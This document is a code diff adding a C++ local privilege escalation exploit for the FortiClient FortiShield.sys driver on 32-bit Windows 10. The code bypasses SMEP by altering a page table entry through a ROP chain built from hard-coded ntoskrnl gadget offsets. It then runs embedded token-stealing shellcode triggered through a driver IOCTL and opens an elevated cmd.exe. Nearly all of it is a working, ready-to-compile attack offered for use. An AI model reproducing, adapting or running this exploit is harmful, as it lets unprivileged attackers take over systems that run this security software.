@@ -1,0 +1,243 @@
+/*
+Check these out:
+- https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf
+- https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/
+Tested on:
+- Windows 10 Pro x86 1703/1709
+- ntoskrnl.exe: 10.0.16299.309
+- FortiShield.sys: 5.2.3.633
+Compile:
+- i686-w64-mingw32-g++ forticlient_win10_x86.cpp -o forticlient_win10_x86.exe -m32 -lpsapi
+ 
+Thanks to master @ryujin and @ronin for helping out. And thanks to Morten (@Blomster81) for the MiGetPteAddress :D
+and m00 to @g0tmi1k <3
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <Windows.h>
+#include <Psapi.h>
+
+DWORD get_pxe_address_32(DWORD address) {
+
+	DWORD result = address >> 9;
+	result = result | 0xC0000000;
+	result = result & 0xC07FFFF8;
+	return result;
+}
+
+LPVOID GetBaseAddr(char *drvname) {
+
+	LPVOID drivers[1024];
+	DWORD cbNeeded;
+	int nDrivers, i = 0;
+
+	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
+		char szDrivers[1024];
+		nDrivers = cbNeeded / sizeof(drivers[0]);
+		for (i = 0; i < nDrivers; i++) {
+			if (GetDeviceDriverBaseName(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
+				if (strcmp(szDrivers, drvname) == 0) {
+					return drivers[i];
+				}
+			}
+		}
+	}
+	return 0;
+}
+
+int find_gadget(HMODULE lpFileName, unsigned char search_opcode[], int opcode_size) {
+
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileName;
+    if(dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        printf("[!] Invalid file.\n");
+        exit(1);
+    }
+
+    //Offset of NT Header is found at 0x3c location in DOS header specified by e_lfanew
+    //Get the Base of NT Header(PE Header)  = dosHeader + RVA address of PE header
+    PIMAGE_NT_HEADERS ntHeader;
+    ntHeader = (PIMAGE_NT_HEADERS)((ULONGLONG)(dosHeader) + (dosHeader->e_lfanew));
+    if(ntHeader->Signature != IMAGE_NT_SIGNATURE){
+        printf("[!] Invalid PE Signature.\n");
+        exit(1);
+    }
+
+    //Info about Optional Header
+    IMAGE_OPTIONAL_HEADER opHeader;
+    opHeader = ntHeader->OptionalHeader;
+
+    unsigned char *ntoskrnl_buffer = (unsigned char *)malloc(opHeader.SizeOfCode);
+    SIZE_T size_read;
+
+    //ULONGLONG ntoskrnl_code_base = (ULONGLONG)lpFileName + opHeader.BaseOfCode;
+    BOOL rpm = ReadProcessMemory(GetCurrentProcess(), lpFileName, ntoskrnl_buffer, opHeader.SizeOfCode, &size_read);
+    if (rpm == 0) {
+        printf("[!] Error while calling ReadProcessMemory: %d\n", GetLastError());
+        exit(1);
+    }
+
+    int j;
+    int z;
+    DWORD gadget_offset = 0;
+
+    for (j = 0; j < opHeader.SizeOfCode; j++) {
+        unsigned char *gadget = (unsigned char *)malloc(opcode_size);
+        memset(gadget, 0x00, opcode_size);
+        for (z = 0; z < opcode_size; z++) {
+            gadget[z] = ntoskrnl_buffer[j - z];
+        }
+
+        int comparison;
+        comparison = memcmp(search_opcode, gadget, opcode_size);
+        if (comparison == 0) {
+            gadget_offset = j - (opcode_size - 1);
+        }
+    }
+
+    if (gadget_offset == 0) {
+        printf("[!] Error while retrieving the gadget, exiting.\n");
+        exit(1);
+    }
+    return gadget_offset;
+}
+
+LPVOID allocate_shellcode(LPVOID nt, DWORD fortishield_callback, DWORD fortishield_restore, DWORD pte_result, HMODULE lpFileName) {
+
+    HANDLE pid;
+    pid = GetCurrentProcess();
+    DWORD shellcode_address = 0x22ffe000;
+    LPVOID allocate_shellcode;
+    allocate_shellcode = VirtualAlloc((LPVOID *)shellcode_address, 0x12000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (allocate_shellcode == NULL) {
+        printf("[!] Error while allocating rop_chain: %d\n", GetLastError());
+        exit(1);
+    }
+
+
+    /** Windows 10 1703 ROPS
+    DWORD rop_01 = (DWORD)nt + 0x002fe484;
+    DWORD rop_02 = 0x00000063;
+    DWORD rop_03 = (DWORD)nt + 0x0002bbef;
+    DWORD rop_04 = (DWORD)pte_result - 0x01;
+    DWORD rop_05 = (DWORD)nt + 0x000f8d49;
+    DWORD rop_06 = 0x41414141;
+    DWORD rop_07 = (DWORD)nt + 0x000e8a46;
+    DWORD rop_08 = 0x2300d1b8;
+    **/
+
+    /** Windows 10 1709 ROPS **/
+    DWORD rop_01 = (DWORD)nt + 0x0002a8c8;
+    DWORD rop_02 = 0x00000063;
+    DWORD rop_03 = (DWORD)nt + 0x0003a3a3;
+    DWORD rop_04 = (DWORD)pte_result - 0x01;
+    DWORD rop_05 = (DWORD)nt + 0x0008da19;
+    DWORD rop_06 = 0x41414141;
+    DWORD rop_07 = (DWORD)nt + 0x001333ce;
+    DWORD rop_08 = 0x2300d1b8;
+
+    char token_steal[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
+                         "\x8b\x84\x24\xa0\x00\x00\x00\x31"
+                         "\xc9\x89\x08\x31\xc0\x64\x8b\x80"
+                         "\x24\x01\x00\x00\x8b\x80\x80\x00"
+                         "\x00\x00\x89\xc1\x8b\x80\xb8\x00"
+                         "\x00\x00\x2d\xb8\x00\x00\x00\x83"
+                         "\xb8\xb4\x00\x00\x00\x04\x75\xec"
+                         "\x8b\x90\xfc\x00\x00\x00\x89\x91"
+                         "\xfc\x00\x00\x00\x89\xf8\x83\xe8"
+                         "\x20\x50\x8b\x84\x24\xa8\x00\x00"
+                         "\x00\x5c\x89\x04\x24\x89\xfd\x81"
+                         "\xc5\x04\x04\x00\x00\xc2\x04\x00";
+
+    char *shellcode;
+    DWORD shellcode_size = 0x12000;
+    shellcode = (char *)malloc(shellcode_size);
+    memset(shellcode, 0x41, shellcode_size);
+    memcpy(shellcode + 0x2000, &rop_01, 0x04);
+    memcpy(shellcode + 0xf18f, &rop_02, 0x04);
+    memcpy(shellcode + 0xf193, &rop_03, 0x04);
+    memcpy(shellcode + 0xf197, &rop_04, 0x04);
+    memcpy(shellcode + 0xf19b, &rop_05, 0x04);
+    memcpy(shellcode + 0xf19f, &rop_06, 0x04);
+    memcpy(shellcode + 0xf1a3, &rop_07, 0x04);
+    memcpy(shellcode + 0xf1af, &rop_08, 0x04);
+    memcpy(shellcode + 0xf1b8, &token_steal, sizeof(token_steal));
+    memcpy(shellcode + 0xf253, &fortishield_callback, 0x04);
+    memcpy(shellcode + 0xf257, &fortishield_restore, 0x04);
+
+
+    BOOL WPMresult;
+    SIZE_T written;
+    WPMresult = WriteProcessMemory(pid, (LPVOID)shellcode_address, shellcode, shellcode_size, &written);
+    if (WPMresult == 0)
+    {
+        printf("[!] Error while calling WriteProcessMemory: %d\n", GetLastError());
+        exit(1);
+    }
+    printf("[+] Memory allocated at: %p\n", allocate_shellcode);
+    return allocate_shellcode;
+}
+
+DWORD trigger_callback() {
+
+	printf("[+] Creating dummy file\n");
+	system("echo test > test.txt");
+
+	printf("[+] Calling MoveFileEx()\n");
+	BOOL MFEresult;
+	MFEresult = MoveFileEx((LPCSTR)"test.txt", (LPCSTR)"test2.txt", MOVEFILE_REPLACE_EXISTING);
+	if (MFEresult == 0)
+	{
+		printf("[!] Error while calling MoveFileEx(): %d\n", GetLastError());
+		return 1;
+	}
+	return 0;
+}
+
+int main() {
+
+	HANDLE forti;
+	forti = CreateFile((LPCSTR)"\\\\.\\FortiShield", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (forti == INVALID_HANDLE_VALUE) {
+		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
+		return 1;
+	}
+
+    HMODULE ntoskrnl = LoadLibrary((LPCSTR)"C:\\Windows\\System32\\ntoskrnl.exe");
+    if (ntoskrnl == NULL) {
+        printf("[!] Error while loading ntoskrnl: %d\n", GetLastError());
+        exit(1);
+    }
+
+    LPVOID nt = GetBaseAddr((char *)"ntoskrnl.exe");
+	LPVOID fortishield_base = GetBaseAddr((char *)"FortiShield.sys");
+
+	DWORD va_pte = get_pxe_address_32(0x2300d000);
+	DWORD pivot = (DWORD)nt + 0x0009b8eb;
+	DWORD fortishield_callback = (DWORD)fortishield_base + 0xba70;
+	DWORD fortishield_restore = (DWORD)fortishield_base + 0x1e95;
+
+	printf("[+] KERNEL found at: %llx\n", (DWORD)nt);
+	printf("[+] FortiShield.sys found at: %llx\n", (DWORD)fortishield_base);
+	printf("[+] PTE virtual address at: %llx\n", va_pte);
+
+    LPVOID shellcode_allocation;
+    shellcode_allocation = allocate_shellcode(nt, fortishield_callback, fortishield_restore, va_pte, ntoskrnl);
+
+	DWORD IoControlCode = 0x220028;
+	DWORD InputBuffer = pivot;
+	DWORD InputBufferLength = 0x4;
+	DWORD OutputBuffer = 0x0;
+	DWORD OutputBufferLength = 0x0;
+	DWORD lpBytesReturned;
+
+    //DebugBreak();
+
+	BOOL triggerIOCTL;
+	triggerIOCTL = DeviceIoControl(forti, IoControlCode, (LPVOID)&InputBuffer, InputBufferLength, (LPVOID)&OutputBuffer, OutputBufferLength, &lpBytesReturned, NULL);
+	trigger_callback();
+
+    system("start cmd.exe");
+
+	return 0;
+}
